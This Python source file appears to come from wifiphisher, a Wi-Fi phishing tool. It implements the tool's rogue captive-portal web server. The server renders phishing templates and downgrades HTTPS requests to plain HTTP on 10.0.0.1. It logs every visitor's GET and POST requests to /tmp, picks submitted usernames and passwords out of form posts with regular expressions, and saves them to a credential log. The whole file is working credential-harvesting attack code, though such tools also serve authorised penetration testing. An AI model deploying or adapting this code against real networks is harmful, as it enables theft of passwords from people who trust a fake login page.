import datetime
import logging
import json
import re
import time
from tornado.escape import json_decode
import tornado.ioloop
import tornado.web
import os.path
import wifiphisher.common.uimethods as uimethods
import wifiphisher.common.extensions as extensions
import wifiphisher.common.constants as constants

hn = logging.NullHandler()
hn.setLevel(logging.DEBUG)
logging.getLogger('tornado.access').disabled = True
logging.getLogger('tornado.general').disabled = True

template = False
terminate = False
creds = []
logger = logging.getLogger(__name__)
credential_log_path = None


class DowngradeToHTTP(tornado.web.RequestHandler):
    def get(self):
        self.redirect("http://10.0.0.1:8080/")


class BackendHandler(tornado.web.RequestHandler):
    """
    Validate the POST requests from client by the uimethods
    """

    def initialize(self, em):
        """
        :param self: A tornado.web.RequestHandler object
        :param em: An extension manager object
        :type self: tornado.web.RequestHandler
        :type em: ExtensionManager
        :return: None
        :rtype: None
        """

        self.em = em

    def post(self):
        """
        :param self: A tornado.web.RequestHandler object
        :type self: tornado.web.RequestHandler
        :return: None
        :rtype: None
        ..note: override the post method to do the verification
        """

        json_obj = json_decode(self.request.body)
        response_to_send = {}
        backend_methods = self.em.get_backend_funcs()
        # loop all the required verification methods
        for func_name in list(json_obj.keys()):
            if func_name in backend_methods:
                # get the corresponding callback
                callback = getattr(backend_methods[func_name], func_name)
                # fire the corresponding varification method
                response_to_send[func_name] = callback(json_obj[func_name])
            else:
                response_to_send[func_name] = "NotFound"

        self.write(json.dumps(response_to_send))


class CaptivePortalHandler(tornado.web.RequestHandler):
    def get(self):
        """
        Override the get method

        :param self: A tornado.web.RequestHandler object
        :type self: tornado.web.RequestHandler
        :return: None
        :rtype: None
        """

        requested_file = self.request.path[1:]
        template_directory = template.path

        # choose the correct file to serve
        if os.path.isfile(template_directory + requested_file):
            render_file = requested_file
        else:
            render_file = "index.html"

        # load the file
        file_path = template_directory + render_file
        self.render(file_path, **template.context)

        log_file_path = "/tmp/wifiphisher-webserver.tmp"
        with open(log_file_path, "a+") as log_file:
            log_file.write("GET request from {0} for {1}\n".format(
                self.request.remote_ip, self.request.full_url()))
        # record the GET request in the logging file
        logger.info("GET request from %s for %s", self.request.remote_ip,
                    self.request.full_url())

    def post(self):
        """
        Override the post method

        :param self: A tornado.web.RequestHandler object
        :type self: tornado.web.RequestHandler
        :return: None
        :rtype: None
        ..note: we only serve the Content-Type which starts with
        "application/x-www-form-urlencoded" as a valid post request
        """

        global terminate

        # check the http POST request header contains the Content-Type
        try:
            content_type = self.request.headers["Content-Type"]
        except KeyError:
            return

        # check if this is a valid phishing post request
        if content_type.startswith(constants.VALID_POST_CONTENT_TYPE):
            post_data = tornado.escape.url_unescape(self.request.body)
            # log the data
            log_file_path = "/tmp/wifiphisher-webserver.tmp"
            with open(log_file_path, "a+") as log_file:
                log_file.write("POST request from {0} with {1}\n".format(
                    self.request.remote_ip, post_data))
                # record the post requests in the logging file
                logger.info("POST request from %s with %s",
                            self.request.remote_ip, post_data)
            if re.search(constants.REGEX_PWD, post_data, re.IGNORECASE) or \
               re.search(constants.REGEX_UNAME, post_data, re.IGNORECASE):
                if credential_log_path:
                    with open(credential_log_path, 'a+') as credential_log:
                        credential_log.write("{} {}".format(
                            time.strftime(constants.CREDENTIALS_DATETIME_FORMAT),
                            "POST request from {0} with {1}\n".format(
                                self.request.remote_ip, post_data)))
                creds.append(post_data)
                terminate = True

        requested_file = self.request.path[1:]
        template_directory = template.get_path()

        # choose the correct file to serve
        if os.path.isfile(template_directory + requested_file):
            render_file = requested_file
        else:
            render_file = "index.html"

        # load the file
        file_path = template_directory + render_file
        self.render(file_path, **template.context)


def runHTTPServer(ip, port, ssl_port, t, em):
    global template
    template = t

    # Get all the UI funcs and set them to uimethods module
    for f in em.get_ui_funcs():
        setattr(uimethods, f.__name__, f)

    app = tornado.web.Application(
        [
            (r"/backend/.*", BackendHandler, {
                "em": em
            }),
            (r"/.*", CaptivePortalHandler),
        ],
        template_path=template.get_path(),
        static_path=template.static_path,
        compiled_template_cache=False,
        ui_methods=uimethods)
    app.listen(port, address=ip)

    ssl_app = tornado.web.Application([(r"/.*", DowngradeToHTTP)])

    https_server = tornado.httpserver.HTTPServer(
        ssl_app,
        ssl_options={
            "certfile": constants.PEM,
            "keyfile": constants.PEM,
        })
    https_server.listen(ssl_port, address=ip)

    tornado.ioloop.IOLoop.instance().start()
